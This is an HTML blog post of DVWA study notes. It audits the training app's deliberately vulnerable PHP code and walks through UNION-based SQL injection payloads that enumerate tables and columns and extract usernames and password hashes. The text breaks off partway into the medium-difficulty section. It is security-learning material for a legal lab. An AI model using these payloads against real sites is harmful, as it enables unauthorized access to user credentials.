@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fre4k5en.com","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.8.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="Damn Vulnerable Web App (DVWA) is a PHP&#x2F;MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA Study Notes-SQL Injection">
+<meta property="og:url" content="https://fre4k5en.com/2021/11/04/DVWA-Study-Notes-SQL-Injection/index.html">
+<meta property="og:site_name" content="最后的家">
+<meta property="og:description" content="Damn Vulnerable Web App (DVWA) is a PHP&#x2F;MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment,">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gph1dz2lx4j312c0ry0wg.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gph1h794n8j31130u042i.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gpgy90omaaj31b80domyp.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gpgydh5aowj30kq0dkjsl.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gpgyuke6hpj30tm0pc78i.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gpgyz02ocej31220pq0x2.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gpgz4bxhl9j313e0qcdk7.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gpgzazp77fj313w0myjvr.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gpgzbx1sfhj31ae0ngac5.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gpgz8u17ftj31jc0lgac3.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gpgzajkcobj319e0u0wzv.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gphusy3q3zj31200k041a.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gphuw6f3z7j31me0mytg5.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gphuzijsufj31oo0pm45v.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gphw6jjplij31vy0t27de.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gpic54c57ej31ou0cigom.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gpiao0ndc8j31820u0aft.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gpibwsw30fj31cg0mwn67.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gpj3qukc0wj30so0qgjug.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gpj401jxndj316w0ecdil.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gpj3zn018kj30js0i4tb1.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gpj44dhpicj314u0faq5v.jpg">
+<meta property="article:published_time" content="2021-11-04T08:10:26.000Z">
+<meta property="article:modified_time" content="2021-11-04T09:39:00.651Z">
+<meta property="article:author" content="Fre4k5en">
+<meta property="article:tag" content="Pentest-Learning">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gph1dz2lx4j312c0ry0wg.jpg">
+
+
+<link rel="canonical" href="https://fre4k5en.com/2021/11/04/DVWA-Study-Notes-SQL-Injection/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fre4k5en.com/2021/11/04/DVWA-Study-Notes-SQL-Injection/","path":"2021/11/04/DVWA-Study-Notes-SQL-Injection/","title":"DVWA Study Notes-SQL Injection"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>DVWA Study Notes-SQL Injection | 最后的家</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">最后的家</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Fre4k5en's Shelter</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection"><span class="nav-text">SQL Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Difficulty-Low"><span class="nav-text">Difficulty: Low</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-audit"><span class="nav-text">Code audit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Injection"><span class="nav-text">Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Determine-SQL-Injection"><span class="nav-text">Determine SQL Injection</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#find-the-number-of-columns-in-current-table"><span class="nav-text">find the number of columns in current table</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Find-the-display-position"><span class="nav-text">Find the display position</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Find-the-Database-name"><span class="nav-text">Find the Database name</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Find-the-Table-name"><span class="nav-text">Find the Table name</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Find-the-right-column"><span class="nav-text">Find the right column</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Get-the-credentials"><span class="nav-text">Get the credentials</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Error-handling"><span class="nav-text">Error handling</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Difficulty-Medium"><span class="nav-text">Difficulty: Medium</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-Audit"><span class="nav-text">Code Audit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Injection-1"><span class="nav-text">Injection</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Difficulty-Medium-1"><span class="nav-text">Difficulty: Medium</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-audit-1"><span class="nav-text">Code audit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Difficulty-Impassible"><span class="nav-text">Difficulty: Impassible</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-audit-2"><span class="nav-text">Code audit</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Brute-Force"><span class="nav-text">Brute Force</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Difficulty-Low-1"><span class="nav-text">Difficulty: Low</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Difficulty-Medium-2"><span class="nav-text">Difficulty: Medium</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Fre4k5en"
+      src="https://cdn.jsdelivr.net/gh/Fre4k5en/BlogAssets/logo.jpeg">
+  <p class="site-author-name" itemprop="name">Fre4k5en</p>
+  <div class="site-description" itemprop="description">我的朋友好像都是网上的那些人，现实中不爱理人也没有人理我。有一天妈妈突然问我，万一有一天网络消失了，你该怎么办？那一刻我如醍醐灌顶，想通了很多事情。原来我人生中最重要的使命，就是保护互联网，不让它消失。</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/fre4k5en" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;fre4k5en" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:fre4k5en@gmail.com" title="E-Mail → mailto:fre4k5en@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fre4k5en.com/2021/11/04/DVWA-Study-Notes-SQL-Injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/Fre4k5en/BlogAssets/logo.jpeg">
+      <meta itemprop="name" content="Fre4k5en">
+      <meta itemprop="description" content="我的朋友好像都是网上的那些人，现实中不爱理人也没有人理我。有一天妈妈突然问我，万一有一天网络消失了，你该怎么办？那一刻我如醍醐灌顶，想通了很多事情。原来我人生中最重要的使命，就是保护互联网，不让它消失。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="最后的家">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DVWA Study Notes-SQL Injection
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-11-04 16:10:26 / Modified: 17:39:00" itemprop="dateCreated datePublished" datetime="2021-11-04T16:10:26+08:00">2021-11-04</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.</p>
+<p><a target="_blank" rel="noopener" href="https://dvwa.co.uk/">https://dvwa.co.uk/</a></p>
+<span id="more"></span>
+
+<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h4 id="Difficulty-Low"><a href="#Difficulty-Low" class="headerlink" title="Difficulty: Low"></a>Difficulty: Low</h4><p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gph1dz2lx4j312c0ry0wg.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gph1dz2lx4j312c0ry0wg.jpg" alt="image-20210412162333917"></a></p>
+<p>As we can see ,there’s a input box and form that shows the ID, First name and Surname by receiving input ID.</p>
+<h4 id="Code-audit"><a href="#Code-audit" class="headerlink" title="Code audit"></a>Code audit</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	<span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check database</span></span><br><span class="line">	<span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get results</span></span><br><span class="line">	<span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// Get values</span></span><br><span class="line">		<span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">		<span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for end user</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>in line 8,$id is the variable that controll by user, so user can splicing special characters in the code so as to achieve the purpose of injection.</p>
+<p>The spliced code becomes:</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$query  = &quot;<span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id = <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">database</span>(),group_concat(<span class="keyword">user</span>,<span class="keyword">password</span>) <span class="keyword">from</span> dvwa.users #<span class="string">&#x27;;&quot;;</span></span><br></pre></td></tr></table></figure>
+
+<p>By closing the single quotation mark, the UNION SELECT is spliced to find the user and password information.</p>
+<h4 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h4><h5 id="Determine-SQL-Injection"><a href="#Determine-SQL-Injection" class="headerlink" title="Determine SQL Injection"></a>Determine SQL Injection</h5><p>If we submit a Single quotes, the page will return an Error message.</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gph1h794n8j31130u042i.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gph1h794n8j31130u042i.jpg" alt="image-20210412162640479"></a></p>
+<p>That means this page has a Error-based SQL Injection vulnerability.</p>
+<p>So we can construct a payload and makes this page show us the information we want. Like the account credentials and etc.</p>
+<p>At first we should find the Database name of this back-end database.then get the table name, and finnally we get the username and password.</p>
+<h5 id="find-the-number-of-columns-in-current-table"><a href="#find-the-number-of-columns-in-current-table" class="headerlink" title="find the number of columns in current table"></a>find the number of columns in current table</h5><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>Error page is displayed</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gpgy90omaaj31b80domyp.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpgy90omaaj31b80domyp.jpg" alt="image-20210412143501081"></a></p>
+<p>Change 3 to 2</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">2</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>we see the normal page, so now we know it has 2 columns in the table.</p>
+<h5 id="Find-the-display-position"><a href="#Find-the-display-position" class="headerlink" title="Find the display position"></a>Find the display position</h5><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">111</span>,<span class="number">222</span> <span class="meta">#</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gpgydh5aowj30kq0dkjsl.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpgydh5aowj30kq0dkjsl.jpg" alt="image-20210412143917931"></a></p>
+<h5 id="Find-the-Database-name"><a href="#Find-the-Database-name" class="headerlink" title="Find the Database name"></a>Find the Database name</h5><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">database</span>() <span class="meta">#</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gpgyuke6hpj30tm0pc78i.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpgyuke6hpj30tm0pc78i.jpg" alt="image-20210412145543267"></a></p>
+<h5 id="Find-the-Table-name"><a href="#Find-the-Table-name" class="headerlink" title="Find the Table name"></a>Find the Table name</h5><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1&#x27;</span> <span class="function">union <span class="keyword">select</span> <span class="title">database</span>(<span class="params"></span>),<span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=database() <span class="meta">#</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gpgyz02ocej31220pq0x2.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpgyz02ocej31220pq0x2.jpg" alt="image-20210412145959255"></a></p>
+<p>The experience told me that ‘users’ is the table which we want.If not we can change table name ‘users’ to ‘guestbook’ and continue.</p>
+<h5 id="Find-the-right-column"><a href="#Find-the-right-column" class="headerlink" title="Find the right column"></a>Find the right column</h5><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1&#x27;</span> <span class="function">union <span class="keyword">select</span> <span class="title">database</span>(<span class="params"></span>),<span class="title">group_concat</span>(<span class="params">column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span> = <span class="string">&quot;users&quot;</span> <span class="meta">#</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gpgz4bxhl9j313e0qcdk7.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpgz4bxhl9j313e0qcdk7.jpg" alt="image-20210412150505623"></a></p>
+<p>It is easy to find, the column user and password are the target column</p>
+<h5 id="Get-the-credentials"><a href="#Get-the-credentials" class="headerlink" title="Get the credentials"></a>Get the credentials</h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1&#x27; union <span class="keyword">select</span> <span class="keyword">database</span>(),group_concat(<span class="keyword">user</span>,<span class="keyword">password</span>) <span class="keyword">from</span> dvwa.users #</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gpgzazp77fj313w0myjvr.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpgzazp77fj313w0myjvr.jpg" alt="image-20210412151130260"></a></p>
+<p>As we can see, the password has been encrypted by md5 in MySQL.</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gpgzbx1sfhj31ae0ngac5.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpgzbx1sfhj31ae0ngac5.jpg" alt="image-20210412151223918"></a></p>
+<h4 id="Error-handling"><a href="#Error-handling" class="headerlink" title="Error handling"></a>Error handling</h4><p>Sometimes this error message will be encountered when querying</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gpgz8u17ftj31jc0lgac3.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpgz8u17ftj31jc0lgac3.jpg" alt="image-20210412150925828"></a></p>
+<p>It is caused by the inconsistent sorting of query objects in the UNION SELECT.</p>
+<p>We need to set the column sorting method to be queried to be consistent to solve this error</p>
+<p>Set sorting rules utf8_unicode_ci to utf8_general_ci</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gpgzajkcobj319e0u0wzv.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpgzajkcobj319e0u0wzv.jpg" alt="image-20210412151104538"></a></p>
+<hr>
+<h3 id="Difficulty-Medium"><a href="#Difficulty-Medium" class="headerlink" title="Difficulty: Medium"></a>Difficulty: Medium</h3><p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gphusy3q3zj31200k041a.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gphusy3q3zj31200k041a.jpg" alt="image-20210413092120240"></a></p>
+<p>There’s a drop-down menu that submit User ID to server by POST.</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gphuw6f3z7j31me0mytg5.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gphuw6f3z7j31me0mytg5.jpg" alt="image-20210413092426304"></a></p>
+<h4 id="Code-Audit"><a href="#Code-Audit" class="headerlink" title="Code Audit"></a>Code Audit</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$id</span> = mysqli_real_escape_string(<span 